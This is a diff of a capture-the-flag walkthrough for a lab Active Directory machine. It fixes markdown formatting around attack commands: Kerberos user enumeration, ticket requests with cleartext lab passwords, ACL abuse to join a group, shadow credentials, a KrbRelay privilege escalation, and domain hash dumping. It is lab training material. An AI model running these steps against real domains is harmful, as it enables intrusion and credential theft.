@@ -19,9 +19,11 @@ NMAP
 Add **absolute.htb** to /etc/hosts
 Add **dc.absolute.htb** to /etc/hosts
 
+
 - We can download all the images and check if they have Author names attached to them:
+
 ```bash
-exiftool hero\* \| grep "Author"
+exiftool hero* | grep "Author"
 
 ```
 
@@ -76,14 +78,14 @@ with open(infile, "r") as file:
 ![image3](../resources/dbdd55ffe1af486ab541325c988cfd16.png)
 
 ```bash
-./kerbrute -v userenum -d absolute.htb --dc absolute.htb potentials \| grep "VALID"
+./kerbrute -v userenum -d absolute.htb --dc absolute.htb potentials | grep "VALID"
 
 ```
 
 ![image4](../resources/44202a2b62fc491f999a72fa8f2d34af.png)
 
 ```bash
-cat valid_users \| cut -d ":" -f 4 \| cut -d " " -f 2
+cat valid_users | cut -d ":" -f 4 | cut -d " " -f 2
 
 ```
 
@@ -154,6 +156,7 @@ crackmapexec smb dc.absolute.htb --use-kcache --shares
 ![image14](../resources/3d27e948f1df42e0b81184dee0a9bed9.png)
 
 - We need to use impacket's SMB client because it supports Kerberos authentication:
+
 ```bash
 impacket-smbclient -k dc.absolute.htb
 
@@ -167,6 +170,7 @@ But we can't access the share:
 ![image16](../resources/50e74de74bd3425c862b125a4c4a957e.png)
 
 - We have ldap access as well - so we can list all users:
+
 ```bash
 crackmapexec ldap dc.absolute.htb --use-kcache --users
 
@@ -182,6 +186,7 @@ crackmapexec ldap dc.absolute.htb --use-kcache --users
 ![image18](../resources/09fe1c205741484993b17f2b556d900e.png)
 
 - Get a TGT for the svc_smb:
+
 ```bash
 impacket-getTGT 'absolute.htb/svc_smb:AbsoluteSMBService123!'
 
@@ -262,6 +267,7 @@ But if we change the format of the username, as seen in the ldap users dump, to 
 ![image29](../resources/6cea0ad5a7904c0b8a1d8d5af35542c5.png)
 
 - Get a TGT for m.lovegod:
+
 ```bash
 impacket-getTGT 'absolute.htb/m.lovegod:AbsoluteLDAP2022!'
 
@@ -279,6 +285,7 @@ export KRB5CCNAME=m.lovegod.ccache
 - We can't evil-winrm in
 
 - But using the TGT we can run bloodhound remotely:
+
 ```bash
 bloodhound-python -k -c all -d absolute.htb -ns 10.129.229.59 -dc dc.absolute.htb -no-pass -u m.lovegod
 
@@ -339,6 +346,7 @@ Because we have **'owns' permission** for Network Audit **but we are not members
 ![image36](../resources/589099a6888349bb85b01cb53468051a.png)
 
 - If we try and read the ACL's that m.lovegod has over the group - There aren't any:
+
 ```bash
 ./dacledit.py absolute.htb/m.lovegod:AbsoluteLDAP2022! -k -target-dn 'DC=absolute,DC=htb' -dc-ip 10.129.229.59 -action read -principal 'm.lovegod' -target 'Network Audit'
 
@@ -347,6 +355,7 @@ Because we have **'owns' permission** for Network Audit **but we are not members
 ![image37](../resources/641b0c1362db476780c59207e3337831.png)
 
 - Run dacledit.py and change read for write:
+
 ```bash
 ./dacledit.py absolute.htb/m.lovegod:AbsoluteLDAP2022! -k -target-dn 'DC=absolute,DC=htb' -dc-ip 10.129.229.59 -action **write** -principal 'm.lovegod' -target 'Network Audit'
 
@@ -370,6 +379,7 @@ Now that we have Full Control over the group Network Audit - We can add ourselve
 ![image40](../resources/8e4082eeff1443b5a3b80345cf458c04.png)
 
 - Using the net rpc command - we can add the user to the group:
+
 ```bash
 net rpc group addmem "Network Audit" 'm.lovegod' -U 'absolute.htb/m.lovegod' --use-kerberos=required -S dc.absolute.htb --realm absolute.htb
 
@@ -381,6 +391,7 @@ But we get an error
 
 **<u>Kerberos fix:</u>**
 - Make sure the Linux Kerberos library is installed:
+
 ```bash
 sudo apt install krb5-user
 
@@ -410,6 +421,7 @@ Adding dc.absolute.htb as a DNS server
 ![image45](../resources/cf08942530b34e66a28136cc29a03de2.png)
 
 - Because the ACL's get removed, we need to do everything in quick succession:
+
 ```bash
 python3 dacledit.py absolute.htb/m.lovegod:AbsoluteLDAP2022! -k -target-dn 'DC=absolute,DC=htb' -dc-ip 10.129.229.59 -action write -principal 'm.lovegod' -target 'Network Audit' && python3 dacledit.py absolute.htb/m.lovegod:AbsoluteLDAP2022! -k -target-dn 'DC=absolute,DC=htb' -dc-ip 10.129.229.59 -action read -principal 'm.lovegod' -target 'Network Audit' && **net rpc group addmem "Network Audit" 'm.lovegod' -U 'absolute.htb/m.lovegod' --use-kerberos=required -S dc.absolute.htb --realm absolute.htb**
 
@@ -418,6 +430,7 @@ python3 dacledit.py absolute.htb/m.lovegod:AbsoluteLDAP2022! -k -target-dn 'DC=a
 ![image46](../resources/9621bad15b734444a47aca43ab835103.png)
 
 - And then we can check the group members to be sure:
+
 ```bash
 net rpc group members "Network Audit" -U 'absolute.htb/m.lovegod' --use-kerberos=required -S dc.absolute.htb --realm absolute.htb
 
@@ -446,6 +459,7 @@ export KRB5CCNAME=/home/hokage/HTB/Absolute/m.lovegod.ccache
 <u>Option 1 - Certipy:</u>
 
 - At this point, we should have GenericWrite over the winrm_user , so we first check if ADCS is installed, using certipy:
+
 ```bash
 certipy find -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.129.229.59 -target dc.absolute.htb
 
@@ -499,6 +513,7 @@ python3 pywhisker.py -d absolute.htb -u "m.lovegod" -k -t "winrm_user" --action 
 
 ![image55](../resources/52f8bcfafa1042a3be71aa2c34f265e9.png)
 - Downgrade OpenSSL:
+
 ```bash
 pip install pyOpenSSL 23.0.0
 
@@ -580,7 +595,6 @@ The CLSIDs vary among Windows versions, but we can typically use the default one
 
 ```bash
 .\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10
-
 ```
 
 ![image62](../resources/1b751283f29a4823abd1c5c646382e5e.png)
@@ -609,6 +623,7 @@ We can see that there are no interactive sessions
 Logon type 9 is our best option at this point because we will authenticate over the network as another user, with any password we want, while we run the application locally as ourselves
 
 - Test with the "qwinsta" command:
+
 ```bash
 .\runascs.exe winrm_user -d absolute.htb **MadeUpPassword** -l 9 "qwinsta"
 
@@ -617,6 +632,7 @@ Logon type 9 is our best option at this point because we will authenticate over 
 ![image65](../resources/c2f4ec2dfc3540a39252387f0a187064.png)
 
 - Re-run KrbRelay through RunasCs:
+
 ```bash
 .\runascs.exe winrm_user -d absolute.htb MadeUpPassword -l 9 "C:\users\winrm_user\Documents\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10"
 
@@ -627,6 +643,7 @@ Logon type 9 is our best option at this point because we will authenticate over 
 LDAP session established successfully
 
 - Now add the winrm_user to the Administrators group:
+
 ```bash
 .\runascs.exe winrm_user -d absolute.htb MadeUpPassword -l 9 "C:\users\winrm_user\Documents\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10 -add-groupmember Administrators winrm_user"
 
@@ -635,6 +652,7 @@ LDAP session established successfully
 ![image67](../resources/4e4cfc78d78a493e9be291765f17ced3.png)
 
 - Check with:
+
 ```bash
 net user winrm_user
 
@@ -656,7 +674,7 @@ cat root.txt
 ![image69](../resources/c531aa3a5830493ca9d9dc9bed7a02e0.png)
 
 ```bash
-.\Rubeus.exe asktgt /user:DC\$ /certificate:\<certificate (ce text)\> /password:"oH0/mS2@rD4#" /getcredentials /show /nowrap
+.\Rubeus.exe asktgt /user:DC$ /certificate:<certificate(ce text)> /password:"oH0/mS2@rD4#" /getcredentials /show /nowrap
 
 ```
 
@@ -668,15 +686,16 @@ cat root.txt
 Got DC\$ hash - A7864AB463177ACB9AEC553F18F42577
 
 - <u>Dump hashes:</u>
+
 ```bash
-impacket-secretsdump -hashes :A7864AB463177ACB9AEC553F18F42577 'absolute.htb/dc\$@dc.absolute.htb'
+impacket-secretsdump -hashes :A7864AB463177ACB9AEC553F18F42577 'absolute.htb/dc$@dc.absolute.htb'
 
 ```
 
 ![image72](../resources/f68e166d6f9b4f939f9f7914254fd763.png)
 
 ```bash
-crackmapexec smb absolute.htb -u DC\$ -H :A7864AB463177ACB9AEC553F18F42577 --ntds
+crackmapexec smb absolute.htb -u DC$ -H :A7864AB463177ACB9AEC553F18F42577 --ntds
 
 ```
 
